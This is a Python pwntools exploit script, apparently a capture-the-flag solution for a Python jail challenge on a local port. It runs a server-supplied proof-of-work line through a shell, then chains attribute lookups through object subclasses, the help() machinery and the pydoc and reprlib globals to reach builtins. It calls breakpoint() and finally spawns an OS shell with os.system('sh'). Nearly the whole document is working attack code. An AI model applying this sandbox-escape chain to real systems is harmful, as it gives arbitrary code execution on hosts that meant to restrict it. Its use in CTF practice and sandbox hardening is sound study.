from pwn import *
from subprocess import check_output


#p = process(['python3', 'the.py'])
p = remote('localhost', 5000)

p.recvline()
p.sendline(check_output(p.recvline().strip(),shell=True))


def ga(attr: str):
    p.sendline(b'1')
    p.sendline(attr.encode())


def call():
    p.sendline(b'2')


ga('__class__')
ga('__base__')
ga('__subclasses__')
call()  # object.__subclasses__()

# get the last item of the list
ga('__reversed__')
call()
ga('__next__')
call()  # object.__subclasses__()[-1] => _distutils_hack.shim

# use https://github.com/pypa/setuptools/blob/main/_distutils_hack/__init__.py#L220 to see which methods give builtins
ga('__enter__')
ga('__builtins__')  # _distutils_hack.shim.__enter__.__builtins__ => __builtins__.__dict__

# we get the last value in the dict
ga('values')
call()
ga('__reversed__')
call()
ga('__next__')
call()  # list(__builtins__.__dict__.values())[-1] => help
call()  # help()
p.sendline(b'')  # exit help menu

# help function is an object of type _sitebuiltins.Helper, and the __call__ method imports pydoc, which imports reprlib,
# which imports builtins as a module instead of a dict. we can go to reprlib and just get the module builtins and then get breakpoint and win

for i in range(33+7+1):
    ga('__class__')
    ga('__base__')
    ga('__subclasses__')
    call()  # object.__subclasses__()
    ga('__reversed__')
    call()
    ga('__next__')
    call()  # object.__subclasses__()[-1] => pydoc.ModuleScanner
    ga('run')
    ga('__globals__')  # pydoc.ModuleScanner.run.__globals__ => pydoc.__dict__
    if i < 33:
        ga('popitem')  # pydoc.__dict__.popitem() until we the last value is TextRepr or something
        call()
        continue
    ga('values')
    call()
    ga('__reversed__')
    call()
    ga('__next__')
    call()  # pydoc.TextRepr
    ga('__base__')
    ga('__init__')
    ga('__globals__')  # pydoc.TextRepr.__base__.__init__.__globals__ => reprlib.Repr.__init__.__globals__ => reprlib.__dict__
    if i < 33+7:
        ga('popitem')  # pop from reprlib.__dict__ until last value is <module 'builtins'> or something
        call()
        continue
    ga('values')
    call()
    ga('__reversed__')
    call()
    ga('__next__')
    call()  # <module 'builtins'>
    ga('breakpoint')
    call()
    p.sendline(b'__import__("os").system("sh")')  # win

p.interactive()

